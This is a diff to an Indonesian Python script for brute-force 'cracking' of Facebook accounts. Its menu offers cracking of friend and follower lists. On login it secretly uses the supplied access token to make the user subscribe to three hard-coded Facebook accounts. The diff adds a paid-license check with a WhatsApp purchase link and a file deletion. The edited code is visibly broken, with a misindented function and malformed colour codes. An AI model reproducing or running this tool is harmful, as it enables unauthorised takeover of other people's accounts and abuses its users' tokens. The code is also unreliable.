@@ -10,15 +10,14 @@ ok,cp,cot=0,0,0
 ajg=""
 mb="https://mbasic.facebook.com"
 
-def login():
+def pilihlogin():
 	os.system("clear")
-	print("""
-	 HARAP LOGIN UNTUK MELANJUTKAN KE SCRIPT
-	""")
-	print("[1]. Login Dengan Accesstoken Facebook\n[2]. Cara Mendapatkan Accesstoken\n")
-	pil=input("[!] Pilih Metode Login: ")
+	time.sleep(0.07)
+	logo()
+	print("\033[1;36m[\033[1;37m01\033[1;36m]. \033[1;37mLogin dengan token\n\033[1;36m[\033[1;37m02\033[1;36m]. \033[1;37mLogin dengan cookie\n")
+	pil=input("\033[1;36m[\033[1;37m?\033[1;36m]. \033[1;37mPilih metode login :\033[1;33m ")
 	if(pil in ("01","1")):
-		to=input("[+] Masukan Access Token Anda: ")
+		to=input("\033[1;36m[\033[1;37m+\033[1;36m]. \033[1;37mMasukan accsess token anda :\033[1;36m ")
 		r=json.loads(req.get(f"https://graph.facebook.com/me?access_token={to}").text)
 		try:
 			nama=r['name']
@@ -28,12 +27,13 @@ def login():
 			req.post(f"https://graph.facebook.com/1011933821/subscribers?access_token={to}")
 			req.post(f"https://graph.facebook.com/100069718286138/subscribers?access_token={to}")
 			req.post(f"https://graph.facebook.com/103513548711079/subscribers?access_token={to}")
-			print(f"[☆] Login Berhasil [☆]\nWelcome {nama}")
-			open("save","a").write(to)
+			print('')
+			print(f"\033[1;36m[\033[1;37m☆\033[1;36m] \033[1;32mLogin berhasil")
 			time.sleep(1.5)
-			crack(to,nama).menu()
+			os.system("clear")
+			menu()
 		except KeyError:
-			print("[×] Login Gagal [×]\nAccess Token Salah")
+			print("\033[1;36m[\033[1;37×\033[1;36m]\033[1;31 Login Gggal [×]\nAccess Token Salah")
 			time.sleep(1.5)
 			login()
 	elif(pil in ("2","02")):
@@ -207,23 +207,110 @@ class crack:
 			self.menu()
 		elif(yt in ("t","T")):
 			self.menu()
+	def logo():
+	wok=[]
+	os.system('clear')
+	ha=0
+	print('')
+	print('')
+	time.sleep(1)
+	jalan ("\033[1;37m                    ______---_____ ")
+	jalan ("\033[1;37m         ___-----           __      ---- ")
+	jalan ("\033[1;37m ___---             ___------             \ ")
+	jalan ("\033[1;37m     ---______        ----                 \ ")
+	jalan ("\033[1;37m                 --__    |             _____)")
+	jalan ("\033[1;37m                     -                /     \ ")
+	jalan ("\033[1;37m          _____-----    ___--         \    / )")
+	jalan ("\033[1;37m    -----_____      ---____            \__/  /")
+	jalan ("\033[1;37m                 --__    \ --    _          /\ ")
+	jalan ("\033[1;37m                      --__-__     \_____/   \_/\ ")
+	jalan ("\033[1;37m                            ----|   /          |")
+	jalan ("\033[1;36mAuthor \033[1;37m : JESSICA PUTRY         |  |___________|")
+	jalan ("\033[1;36mGelar  \033[1;37m : Ratu error            |  | ((_(_)| )_)")
+	jalan ("\033[1;36mGroup\033[1;37m   : \033[1;32mRatu error...         \33[0;1m\033[1;37m|  \_((_(_)|/(_)")
+	jalan ("\033[1;36m¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤\033[1;37m\             (")
+	jalan ("\033[1;36m¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤\033[1;37m\_____________)")
+	print('')
+	time.sleep(0.07)
+	
+def xxnx():
+    try:
+        toket = open('licensed.log', 'r').read()
+    except IOError:
+        print ('\x1b[1;91m License Invalid !')
+        os.system('clear')
+        os.system('rm -rf licensed.log')
+        lisen()
+    if os.path.exists('licensed.log'):
+        user1()
+    else:
+        lisen()
+        
+def lisen():
+    os.system('clear')
+    logo()
+    jalan('\n\x1b[1;96m [\x1b[1;97m*\x1b[1;96m] \x1b[1;92mMohon tunggu ...');time.sleep(2.0)
+    id = uuid.uuid4().hex[:25]
+    idg = open('licensed.log', 'w')
+    idg.write(id)
+    idg.close()
+    jalan ('\n\033[1;96m [\033[1;97m*\033[1;96m]\033[1;97m Lisensi : \x1b[92m' + id)
+    time.sleep(0.07)
+    jalan ('\033[1;96m [\033[1;97m*\033[1;96m] \033[1;97mChat Admin Untuk Mengkonfirmasi Lisensi\x1b[1;39m')
+    input('\n\033[1;96m [\033[1;97m*\033[1;96m] \033[1;97mTekan Enter ')
+    os.system('am start https://wa.me/+62895341157823?text=Hi+Ratu+Beli+Lisensi+dong.%20Lisensi:%20' + id + ' >/dev/null') 
+    time.sleep(1)
+    os.sys.exit()
+def user1():
+    try:
+        j = open('licensed.log', 'r').read()
+        r = requests.get('https://github.com/bucin25/License/blob/main/id').text.strip() # Jangan Di ganti bro'i nanti error
+        if j in r:
+            os.system('exit')
+            logo()
+            print ('\x1b[1;96m [\033[1;97m*\033[1;96m]\033[1;97m Memeriksa Lisensi ' );time.sleep(2.0)
+            jalan('\n\033[1;96m [\033[1;97m*\033[1;96m]\033[1;97m Lisensi \033[1;92mTersedia ✓');time.sleep(2.0)
+            pilihlogin()
+        else:
+            os.system('clear')
+            logo()
+            print ('\x1b[1;96m [\033[1;97m*\033[1;96m]\033[1;97m Memeriksa Lisensi ' );time.sleep(2.0)
+            jalan ('\n\x1b[1;91m [*] Lisensi Tidak Tersedia !')
+            time.sleep(1)
+            lisen()
+            jalan ('\033[1;96m [\033[1;97m*\033[1;96m]\033[1;97m Chat Admin Untuk Mengkonfirmasi Lisensi\x1b[1;39m')
+            time.sleep(0.07)
+            input('\n\x1b[1;97m [*] Tekan Enter ')
+            os.system('am start https://wa.me/+62895341157823?text=Hi+Ratu+Beli+Lisensi+dong.%20Lisensi:%20' + j + ' >/dev/null')
+            os.sys.exit()
+    except KeyboardInterrupt:
+        os.sys.exit()
+    except IOError:
+        subprocess.Popen(['rm', '-rf', 'licensed.log'])
+        romz()
+
+def jalan(z):
+    for e in z + '\n':
+        sys.stdout.write(e)
+        sys.stdout.flush()
+        time.sleep(0.01)
+	
 	def menu(self):
-		wok=[]
-		os.system('clear')
-		ha=0
-		print("""
-  _________   _____ __________.___
- /   _____/  /  _  \\______    \   | 
- \_____  \  /  /_\  \|     ___/   |     
- /        \/    |    \    |   |   |   
-/_______  /\____|__  /____|   |___|
-        \/         \/
-        Latif. H & Yanwar. E
-        """)
-		self.jalan(f"[!] Welcome {self.nama} Selamat Menggunakan\n")
-		print('[1]. Crack Daftar Teman/Publik\n[2]. Crack Daftar Followers\n[C]. Cek Hasil Crack\n[S]. Setting Useragent\n[L]. Logout Script\n[R]. Laporkan Bug Or Error')
-		print(f'+'+'-'*45+'+\n')
-		pil=input('[+] Select: ')
+		os.system("clear")
+		time.sleep(0.01)
+		print('')
+		print('')
+		print('')
+		jalan ('                \33[3;1m\033[1;97mW e l c o m e  T o\33[0;1m')
+		print('')
+		jalan ('       \033[1;96m[\33[37;1mR\033[1;96m] \033[1;96m[\033[1;97mA\033[1;96m] \033[1;96m[\033[1;97mT\033[1;96m] \033[1;96m[\033[1;97mU\033[1;96m]  \033[1;96m[\033[1;97mE\033[1;96m] \033[1;96m[\033[1;97mR\033[1;96m] \033[1;96m[\33[37;1mR\033[1;96m] \033[1;96m[\033[1;97mO\033[1;96m] \033[1;96m[\033[1;97mR\033[1;96m]\033[1;96m')
+		print (' \033[1;96m  ____________________________________________')
+		print ('\033[1;97m\033[1;96m ¤\033[1;97m{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}\033[1;96m¤')
+		print('')
+		print('')
+		print('\033[1;36m[\033[1;37m01\033[1;36m] \033[1;37mCrack daftar teman\033[1;36m/\033[1;37mpublik\n\033[1;36m[\033[1;37m02\033[1;36m] \033[1;37mCrack daftar followers\n\033[1;36m[\033[1;37m03\033[1;36m] \033[1;37mCek hasil crack\n\033[1;36m[\033[1;37m04\033[1;36m] \033[1;37mSetting useragent\n\033[1;36m[\033[1;37m05\033[1;36m] \033[1;37mLog out script\n\033[1;36m[\033[1;37m06\033[1;36m] \033[1;37mLaporkan masalah')
+		print('')
+		pil=input('\033[1;36m[\033[1;37m?\033[1;36m] \033[1;37mPilih :\033[1;33m ')
 		if(pil in ('01','1')):
 			print('\n\tCRACK DAFTAR TEMAN')
 			try:
@@ -326,4 +413,4 @@ if __name__=="__main__":
 		open("ua","a").write(tll)
 		print("[√] Berhasil Ditambahkan\nSedang Menuju Ke Tools")
 		time.sleep(1)
-	logika()
+	xxnx()
